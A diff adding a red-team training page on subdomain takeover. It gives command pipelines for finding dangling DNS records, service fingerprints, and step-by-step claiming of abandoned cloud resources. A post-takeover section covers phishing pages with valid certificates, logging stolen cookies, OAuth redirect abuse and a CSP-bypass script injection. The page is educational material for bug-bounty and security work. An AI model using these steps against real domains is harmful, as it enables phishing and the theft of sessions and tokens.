@@ -1,0 +1,265 @@
+---
+layout: training-page
+title: "Subdomain Takeover — Red Team Academy"
+module: "Reconnaissance"
+tags:
+  - subdomain-takeover
+  - dns
+  - cname
+  - dangling-dns
+  - bug-bounty
+page_key: "recon-subdomain-takeover"
+---
+<h1>Subdomain Takeover</h1>
+  <p>Subdomain takeover occurs when a DNS CNAME (or A/NS record) points to a cloud resource that no longer exists. An attacker claims that resource and gains control of the subdomain. Despite being well understood, this vulnerability is consistently among the top findings in bug bounty programs because it's an operational problem — teams provision services but rarely clean up DNS records on decommissioning. The impact is severe: cookie theft, CSP bypass, OAuth token theft, phishing on a trusted domain, and valid TLS certificates.</p>
+
+  <h2>Attack Impact</h2>
+  <pre><code># What an attacker can do after subdomain takeover:
+# 1. Steal session cookies scoped to parent domain (.example.com)
+#    → any cookie set on .example.com is sent to attacker-controlled sub.example.com
+# 2. Bypass CSP that trusts *.example.com wildcard
+#    → inject scripts from your controlled subdomain
+# 3. Host convincing phishing pages on trusted domain
+#    → users see app.example.com in browser bar
+# 4. Compromise OAuth/SSO flows if subdomain is in redirect_uri allowlist
+# 5. Obtain valid TLS certificates via HTTP domain validation
+# 6. Receive email if MX records involved (password resets, account verification)
+#    → complete email-based domain validation for TLS certificates
+
+# High-value targets for takeover:
+# - Staging/dev subdomains: staging.example.com, dev.example.com
+# - Marketing microsites: promo.example.com, campaign.example.com
+# - Old product subdomains: shop.example.com (migrated platform)
+# - Support portals: help.example.com, support.example.com</code></pre>
+
+  <h2>Finding Dangling DNS Records</h2>
+  <pre><code># Step 1: Enumerate all subdomains
+amass enum -passive -d example.com -o subdomains.txt
+subfinder -d example.com -o subfinder.txt
+cat subdomains.txt subfinder.txt | sort -u > all_subdomains.txt
+
+# Step 2: Resolve all subdomains and check for CNAME chains
+# httpx shows status and title - dangling records often show cloud provider error pages:
+cat all_subdomains.txt | httpx -silent -status-code -title -follow-redirects | \
+  grep -iE "(404|no such|not found|unclaimed|available|error)"
+
+# Step 3: Extract CNAME records:
+cat all_subdomains.txt | while read sub; do
+  cname=$(dig +short CNAME "$sub")
+  [ -n "$cname" ] && echo "$sub CNAME $cname"
+done
+
+# Step 4: Check if CNAME target resolves:
+cat all_subdomains.txt | while read sub; do
+  cname=$(dig +short CNAME "$sub")
+  if [ -n "$cname" ]; then
+    resolved=$(dig +short A "$cname" 2>/dev/null)
+    if [ -z "$resolved" ]; then
+      echo "DANGLING: $sub → $cname"
+    fi
+  fi
+done</code></pre>
+
+  <h2>Automated Scanning</h2>
+  <pre><code># dnsReaper — dedicated subdomain takeover scanner (40+ service fingerprints):
+pip install git+https://github.com/punk-security/dnsReaper
+dnsreaper file --filename all_subdomains.txt
+
+# nuclei — takeover templates:
+nuclei -l all_subdomains.txt -t dns/subdomain-takeover/
+
+# subfinder + nuclei pipeline:
+subfinder -d example.com -silent | nuclei -t dns/subdomain-takeover/ -silent
+
+# can-i-take-over-xyz reference (community-maintained vulnerable service list):
+# https://github.com/EdOverflow/can-i-take-over-xyz
+
+# tomnomnom's tools pipeline:
+amass enum -d example.com | \
+  httprobe -c 20 | \
+  while read url; do
+    curl -s "$url" | grep -iE "(No such app|There isn't a GitHub|Fastly error|NoSuchBucket)"
+  done</code></pre>
+
+  <h2>Service Fingerprints — Error Response Patterns</h2>
+  <p>These responses indicate the backend no longer exists — the subdomain is likely claimable.</p>
+  <pre><code># AWS S3:
+curl https://sub.example.com
+# → "NoSuchBucket" or "The specified bucket does not exist"
+
+# GitHub Pages:
+# → "There isn't a GitHub Pages site here."
+
+# Heroku:
+# → "No such app" or "herokucdn.com/error-pages/no-such-app.html"
+
+# Azure App Service:
+curl https://sub.example.com
+# → "404 Web Site not found" on *.azurewebsites.net
+
+# Shopify:
+# → "Sorry, this shop is currently unavailable."
+
+# Netlify:
+# → "Not Found - Request ID:"
+
+# Fastly:
+# → "Fastly error: unknown domain:"
+
+# Zendesk:
+# → "Help Center Closed"
+
+# AWS Elastic Beanstalk (*.elasticbeanstalk.com):
+# No response / NXDOMAIN or AWS default page on wrong environment
+
+# Quick check script:
+FINGERPRINTS=(
+  "NoSuchBucket"
+  "There isn't a GitHub Pages site here"
+  "No such app"
+  "404 Web Site not found"
+  "Sorry, this shop is currently unavailable"
+  "Fastly error: unknown domain"
+  "Help Center Closed"
+)
+
+check_takeover() {
+  body=$(curl -s -L "$1" 2>/dev/null)
+  for fp in "${FINGERPRINTS[@]}"; do
+    if echo "$body" | grep -qi "$fp"; then
+      echo "VULNERABLE: $1 (fingerprint: $fp)"
+    fi
+  done
+}
+
+while read sub; do check_takeover "https://$sub"; done &lt; all_subdomains.txt</code></pre>
+
+  <h2>Exploiting Specific Services</h2>
+  <pre><code># AWS S3 Takeover:
+# 1. Confirm bucket name from CNAME: sub.example.com → sub-example-com.s3.amazonaws.com
+# 2. Create bucket with exact same name in any AWS account:
+aws s3 mb s3://sub-example-com --region us-east-1
+# 3. Enable static website hosting:
+aws s3 website s3://sub-example-com --index-document index.html
+# 4. Upload content:
+aws s3 cp index.html s3://sub-example-com/ --acl public-read
+# 5. Subdomain now serves your content
+
+# GitHub Pages Takeover:
+# 1. Confirm CNAME target: sub.example.com → user.github.io
+# 2. Create GitHub repo: [username].github.io or for project pages
+# 3. Enable GitHub Pages in repo settings
+# 4. Set custom domain to: sub.example.com
+# 5. Wait for DNS verification + TLS issuance
+
+# Heroku Takeover:
+# 1. CNAME: sub.example.com → myapp.herokuapp.com
+# 2. Create Heroku app with name "myapp":
+heroku create myapp
+# 3. Add custom domain:
+heroku domains:add sub.example.com --app myapp
+# 4. Deploy minimal app
+
+# Azure App Service Takeover:
+# 1. CNAME: sub.example.com → myapp.azurewebsites.net
+# 2. Create Azure Web App with name "myapp" in any subscription
+# 3. Add custom domain sub.example.com to the Web App
+# Note: Azure has verification mechanism — check if asuid TXT record is missing
+
+# Netlify Takeover:
+# 1. Create new Netlify site
+# 2. Add custom domain: sub.example.com
+# 3. Deploy content</code></pre>
+
+  <h2>NS Record Delegation Takeover</h2>
+  <p>NS delegation takeovers are the most severe — full DNS control over a subdomain zone.</p>
+  <pre><code># Check for NS delegation to non-existent zone:
+dig NS sub.example.com
+# If NS points to e.g.: ns1.deleted-provider.com (provider account closed)
+# And that provider allows new accounts to claim those NS server names
+# → Attacker registers new account, gets same NS servers, controls all DNS for sub.example.com
+
+# Example with AWS Route 53:
+# sub.example.com NS → ns-1234.awsdns-12.com (deleted hosted zone)
+# Anyone creating a new hosted zone for sub.example.com in Route 53
+# may receive the same NS assignments (not guaranteed but possible)
+
+# Test: can you create records for the delegated subdomain?
+# Create a hosted zone for sub.example.com in a fresh AWS account
+# Check if you receive the same NS servers
+
+# Impact of NS takeover:
+# - Control ALL DNS records under sub.example.com
+# - Create A records, MX records, TXT records
+# - Complete any domain validation (HTTP, DNS, email)
+# - Obtain wildcard TLS certificate: *.sub.example.com</code></pre>
+
+  <h2>Post-Takeover — Maximizing Impact</h2>
+  <pre><code># Once you control sub.example.com:
+
+# 1. Obtain TLS certificate (Let's Encrypt):
+certbot certonly --manual --preferred-challenges dns \
+  -d sub.example.com
+# Or use the HTTP challenge if you're serving web content
+
+# 2. Host a phishing page:
+# Set up nginx/Apache with TLS
+# Clone the legitimate app's login page
+# Users see: https://sub.example.com with valid cert
+
+# 3. Steal cookies (if .example.com scope):
+# Any cookies set with Domain=.example.com arrive at your subdomain
+# Set up logging for incoming Cookie headers:
+# Access log: grep "Cookie" nginx_access.log
+
+# 4. OAuth redirect URI abuse:
+# If sub.example.com is an allowed redirect_uri in OAuth config:
+# Craft authorization URL with redirect_uri=https://sub.example.com/callback
+# Steal authorization codes/tokens
+
+# 5. CSP bypass:
+# If CSP includes *.example.com or sub.example.com:
+# Content-Security-Policy: script-src 'self' *.example.com
+# Host malicious JS at https://sub.example.com/evil.js
+# Inject: &lt;script src="https://sub.example.com/evil.js"&gt;&lt;/script&gt;</code></pre>
+
+  <h2>Certificate Transparency for Subdomain Discovery</h2>
+  <pre><code># Certificate Transparency logs expose all issued certificates including subdomains
+# crt.sh — free CT log search:
+curl "https://crt.sh/?q=%.example.com&output=json" | \
+  jq '.[].name_value' | tr -d '"' | sort -u | grep -v '*'
+
+# certspotter:
+curl "https://api.certspotter.com/v1/issuances?domain=example.com&include_subdomains=true&expand=dns_names" | \
+  jq '.[].dns_names[]' | tr -d '"' | sort -u
+
+# Use discovered subdomains as takeover targets:
+# Cross-reference CT-discovered subdomains with DNS to find dangling records
+curl "https://crt.sh/?q=%.example.com&output=json" | \
+  jq -r '.[].name_value' | sort -u | while read sub; do
+    # Check if CNAME exists and resolves
+    cname=$(dig +short CNAME "$sub" 2>/dev/null)
+    if [ -n "$cname" ]; then
+      resolved=$(dig +short A "$cname" 2>/dev/null)
+      [ -z "$resolved" ] && echo "POTENTIAL TAKEOVER: $sub → $cname"
+    fi
+  done</code></pre>
+
+  <h2>Tools</h2>
+  <ul>
+    <li>dnsReaper — <code>github.com/punk-security/dnsReaper</code> — 40+ service fingerprints</li>
+    <li>nuclei — <code>github.com/projectdiscovery/nuclei</code> — subdomain takeover templates</li>
+    <li>subfinder — <code>github.com/projectdiscovery/subfinder</code></li>
+    <li>amass — <code>github.com/owasp-amass/amass</code></li>
+    <li>httpx — <code>github.com/projectdiscovery/httpx</code></li>
+    <li>can-i-take-over-xyz — <code>github.com/EdOverflow/can-i-take-over-xyz</code> — community vulnerability database</li>
+    <li>crt.sh — <code>crt.sh</code> — certificate transparency search</li>
+  </ul>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>OWASP Subdomain Takeover Prevention Cheat Sheet — <code>cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html</code></li>
+    <li>HackerOne Hacktivity subdomain takeover reports — <code>hackerone.com/hacktivity?querystring=subdomain+takeover</code></li>
+    <li>Microsoft: Prevent dangling DNS — <code>learn.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover</code></li>
+    <li>OWASP WSTG-CONFIG-10 — <code>owasp.org/www-project-web-security-testing-guide</code></li>
+  </ul>
